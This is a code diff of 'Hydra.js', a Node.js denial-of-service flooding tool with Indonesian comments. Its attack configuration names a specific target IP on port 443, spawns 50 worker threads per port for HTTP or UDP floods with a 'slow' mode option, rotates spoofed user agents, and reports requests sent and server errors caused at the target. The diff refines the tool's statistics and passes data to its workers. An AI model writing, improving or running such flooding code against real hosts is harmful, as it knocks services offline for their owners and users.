@@ -1,4 +1,6 @@
 // File: Hydra.js
+// Nama skrip: Hydra
+
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const os = require('os');
 const crypto = require('crypto');
@@ -8,14 +10,15 @@ const path = require('path'); // Untuk path worker.js
 // --- Konfigurasi Serangan ---
 const TARGET_IP = '185.108.148.12';
 const PORTS = [443];
-const THREADS_PER_PORT = 50; 
-const ATTACK_TYPE = 'http'; 
-const MODE = 'normal'; 
-const DURATION_SEC = 120; 
-const HTTP_METHOD = 'GET'; 
+const THREADS_PER_PORT = 50; // Akan diterjemahkan ke jumlah worker per port
+const ATTACK_TYPE = 'http'; // 'http' atau 'udp'
+const MODE = 'normal'; // 'normal' atau 'slow'
+const DURATION_SEC = 120; // 0 untuk tak terbatas
+const HTTP_METHOD = 'GET'; // Hanya relevan untuk attackType 'http'
 
-// ... (USER_AGENTS dan CHARSET sama seperti sebelumnya) ...
-const USER_AGENTS = [ 
+// --- Data untuk Worker ---
+// Sebaiknya data besar seperti ini diserahkan ke worker agar tidak membebani main thread
+const USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
@@ -37,10 +40,9 @@ const USER_AGENTS = [
 ];
 const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
 
-
 // --- Statistik Global ---
 let sentRequestsTotal = 0;
-let activeConnectionsTotal = 0; // Total koneksi aktif dari SEMUA worker
+let activeConnectionsTotal = 0; 
 let errorCountTotal = 0;
 let serverErrorsTotal = 0;
 let startTime = Date.now();
@@ -76,13 +78,16 @@ async function main() {
 
     startTime = Date.now(); // Reset start time
 
-    // Interval untuk menampilkan statistik
     const statsInterval = setInterval(() => {
         const elapsed = (Date.now() - startTime) / 1000;
-        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${sentRequestsTotal}\x1b[0m | Active Con: \x1b[1;34m${activeConnectionsTotal}\x1b[0m | Srv Err: \x1b[1;33m${serverErrorsTotal}\x1b[0m | Errors: \x1b[1;31m${errorCountTotal}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
+        const displaySent = isNaN(sentRequestsTotal) ? 0 : sentRequestsTotal;
+        const displayActive = isNaN(activeConnectionsTotal) ? 0 : activeConnectionsTotal;
+        const displaySrvErr = isNaN(serverErrorsTotal) ? 0 : serverErrorsTotal;
+        const displayErrors = isNaN(errorCountTotal) ? 0 : errorCountTotal;
+
+        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${displaySent}\x1b[0m | Active Con: \x1b[1;34m${displayActive}\x1b[0m | Srv Err: \x1b[1;33m${displaySrvErr}\x1b[0m | Errors: \x1b[1;31m${displayErrors}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
     }, 1000);
 
-    // Membuat worker threads
     const workerPromises = [];
     for (const port of PORTS) {
         for (let i = 0; i < THREADS_PER_PORT; i++) {
@@ -94,19 +99,16 @@ async function main() {
                 durationMs: attackDuration, 
                 httpMethod: HTTP_METHOD,
                 workerId: `${port}-${i}`,
-                // Kirimkan USER_AGENTS dan CHARSET jika diperlukan di worker
-                // USER_AGENTS: USER_AGENTS,
-                // CHARSET: CHARSET
+                USER_AGENTS: USER_AGENTS, // Kirim data besar ke worker
+                CHARSET: CHARSET
             };
 
-            // Pastikan path worker.js benar
             const worker = new Worker(path.join(__dirname, 'worker.js'), { workerData });
             workers.push(worker); // Simpan referensi worker
 
             const promise = new Promise((resolve, reject) => {
                 worker.on('message', (message) => {
                     if (message.type === 'stats') {
-                        // Akumulasi statistik dari worker
                         sentRequestsTotal += message.sent || 0;
                         activeConnectionsTotal = message.active !== undefined ? message.active : activeConnectionsTotal;
                         errorCountTotal += message.errors || 0;
@@ -136,28 +138,21 @@ async function main() {
         }
     }
 
-    // Menangani sinyal Ctrl+C
     const sigIntHandler = async () => {
         if (isStopping) return;
         isStopping = true;
         console.log("\nCtrl+C detected. Initiating shutdown...");
         clearInterval(statsInterval);
         
-        // Kirim pesan stop ke semua worker
         for (const worker of workers) {
             try {
-                worker.postMessage({ type: 'stop' }); // Mengirim sinyal stop
-                // Tunggu sebentar agar worker bisa merespons
+                worker.postMessage({ type: 'stop' }); 
                 await new Promise(res => setTimeout(res, 50)); 
-            } catch (e) {
-                // Worker mungkin sudah berhenti
-            }
+            } catch (e) { /* Worker mungkin sudah berhenti */ }
         }
         
         console.log("Waiting for active tasks to finish or timeout...");
-        // Tunggu hingga semua worker selesai atau timeout
         await Promise.allSettled(workerPromises.map(p => 
-            // Tambahkan timeout untuk setiap promise worker agar tidak menunggu selamanya
             Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('Worker timeout during shutdown')), 5000))])
         )).catch(err => { /* Abaikan error saat shutdown */ });
         
@@ -167,7 +162,6 @@ async function main() {
 
     process.on('SIGINT', sigIntHandler);
 
-    // Tunggu semua worker selesai atau error
     try {
         await Promise.all(workerPromises);
         clearInterval(statsInterval);
@@ -183,16 +177,13 @@ async function main() {
         clearInterval(statsInterval);
         console.error("\nAttack encountered critical errors. Stopping...");
         console.error("Details:", err);
-        // Pastikan handler SIGINT di-remove agar tidak dipanggil lagi
         process.removeListener('SIGINT', sigIntHandler);
         process.exit(1);
     } finally {
-        // Hapus listener SIGINT setelah selesai
         process.removeListener('SIGINT', sigIntHandler);
     }
 }
 
-// --- Main Thread Execution ---
 if (isMainThread) {
     main();
 }
